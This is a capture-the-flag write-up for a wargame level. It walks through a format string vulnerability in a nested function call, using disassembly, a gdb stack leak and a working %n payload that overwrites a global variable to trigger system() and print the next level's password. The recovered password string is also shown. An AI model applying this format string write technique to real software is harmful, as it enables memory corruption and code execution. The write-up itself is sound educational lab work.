# Level 4 — Format String Exploitation (Nested Function Call)

## Vulnerability Analysis

In this level, the program structure is slightly more complex, involving a nested function call: `main` calls `n`, and `n` calls `p`.

### The Call Chain

1. **main**: Simply initiates the process by calling `n`.
2. **n**: Allocates a buffer of `0x200` (512 bytes), reads user input using `fgets`, and passes that buffer to function `p`. Crucially, after `p` returns, it checks a global variable.
3. **p**: Contains the vulnerability. It takes the buffer passed from `n` and prints it directly via `printf`.

```assembly
08048444 <p>:
   ...
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt> ; Vulnerable: printf(buffer)

```

## The Goal

To successfully exploit the program, we must trigger the following branching condition located in function `n`:

```assembly
   0x0804848d <+54>:    mov    0x8049810,%eax     ; Load global variable 'm'
   0x08048492 <+59>:    cmp    $0x1025544,%eax    ; Compare 'm' with 0x1025544
   0x08048497 <+64>:    jne    0x80484a5 <n+78>   ; If not equal, exit
   0x08048499 <+66>:    movl   $0x8048590,(%esp)  ; Load command string
   0x080484a0 <+73>:    call   0x8048360 <system@plt> ; Execute system()

```

By inspecting the command string at `0x8048590`, we confirm our objective:

```gdb
(gdb) x/s 0x8048590
0x8048590:   "/bin/cat /home/user/level5/.pass"

```

* **Target Address**: `0x08049810`
* **Required Value**: `0x1025544` (Decimal: **16,930,116**)

## Exploitation Steps

### 1. Find the Stack Argument Offset

We need to determine the position of our input on the stack relative to the `printf` call inside `p`. We leak the stack using several `%08x` specifiers:

```bash
(gdb) run <<< $(python -c 'print "\x10\x98\x04\x08"+"-%08x"*20')
...
-b7ff26b0-bffff764-b7fd0ff4-00000000-00000000-bffff728-0804848d-bffff520-00000200-b7fd1ac0-b7ff37d0-08049810

```

Counting the leaked hex blocks, our target address `08049810` appears at the **12th position**.

### 2. Crafting the Payload

We use the `%n` specifier to write the number of characters printed so far into our target address.

* **Target Address**: 4 bytes.
* **Total needed**: 16,930,116 bytes.
* **Padding calculation**: $16,930,116 - 4 = 16,930,112$ characters.

We use `%16930112d` to generate the necessary character count and `%12$n` to write that count into the 12th argument on the stack.

## Final Execution

The payload is delivered as follows:

```bash
python2 -c 'print "\x10\x98\x04\x08%16930112d%12$n"' | ./level4

```

**Output:**

```text
level4@RainFall:~$ python2 -c 'print "\x10\x98\x04\x08%16930112d%12$n"' | ./level4
       ...[Massive output of spaces]
-1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

```